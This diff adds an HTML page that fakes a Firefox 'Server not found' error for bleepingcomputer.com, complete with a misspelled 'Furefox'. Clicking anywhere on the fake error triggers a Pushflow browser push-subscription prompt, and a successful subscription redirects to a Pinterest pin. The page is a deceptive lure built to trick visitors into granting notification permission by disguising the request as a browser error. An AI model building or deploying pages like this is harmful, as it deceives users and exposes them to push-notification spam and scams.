@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pop1</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/media.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script type="text/javascript">
+        (function (d, t) {
+            // Pushflow settings STARTS, SDK docs: https://pushflow.net/docs/en/sdk 
+            var pushflowSettings = {
+                failedUrl: "",
+                allowUrl: "",
+                onSuccessCallback: function () {
+                    window.location.href = 'https://www.pinterest.ru/pin/710020697484999669/';
+
+                },
+                denyUrls: [],
+                vapidPublic: "BLugf_UcXLuOpuPBNqdFdtOFhUL0Z5_wfou_SD1Ei8cMcf3aR-UMqJ8gJKcCcJC_nT53XgfH7D5TbgFb0WEx70I",
+                feedId: "3696",
+                subscribeOnPageLoad: false
+            };
+            // Pushflow settings ENDS, don't change the code below 
+            var s = d.createElement(t); s.type = 'text/javascript'; s.async = true; s.src = "https://cdn.pushflow.net/scripts/current/sdk/pushflowSDK.js"; s.onload = s.onreadystatechange = function () { var rs = this.readyState; if (rs) if (rs != 'complete') if (rs != 'loaded') return; try { PushflowSDK.init(pushflowSettings) } catch (e) { if (window && window.PushflowSDK) { PushflowSDK.sendLog(e, 'External catch', pushflowSettings) } else { fetch('https://pushflow.net/api/log/', { method: 'POST', headers: { "Content-Type": 'application/json' }, body: JSON.stringify({ place: 'SDK:External catch, no pushflow', options: pushflowSettings, error: e, useragent: navigator.userAgent, url: window.location.href, }), }) } } }; var scr = d.getElementsByTagName(t)[0]; var par = scr.parentNode; par.insertBefore(s, scr);
+        })(document, 'script'); 
+    </script>
+
+</head>
+
+<body id="body">
+    <div onclick="sub()" id="popw" class="wrapper__pop white">
+        <div class="error">
+            <div class="error__top">
+                <div class="error__img"><img src="img/info.svg" alt=""></div>
+                <div class="error__text">
+                    <div class="error__title">Server not found
+                    
+                    </div>
+                    <div class="error__title-info">
+                        Firefox can’t find the server at www.bleepingcomputer.com
+                        <ul>
+                            <li>Check the address for typing errors such as <b>ww</b>.example.com instead of <b>www</b>.example.com</li>
+                            <li>If you are unable to load any pages, check your computer's network connection</li>
+                            <li>If your computer or network is protected by a firewall or proxy, make sure that Furefox is permitted to access <br>the Web</li>
+                        </ul>
+                        <div class="button"><button>Try Again</button></div>
+                    </div>
+                </div>
+                
+            </div>
+            
+        </div>
+    </div>
+    <script>
+        var delay = 3000;
+        function sub() {
+            PushflowSDK.AskSubscription();
+            document.getElementById('popw').classList.add('hidden');
+        }
+        function subdelay() {
+            PushflowSDK.AskSubscription();
+            document.getElementById('popw').classList.add('hidden');
+
+        }
+
+
+    </script>
+</body>
+
+</html>
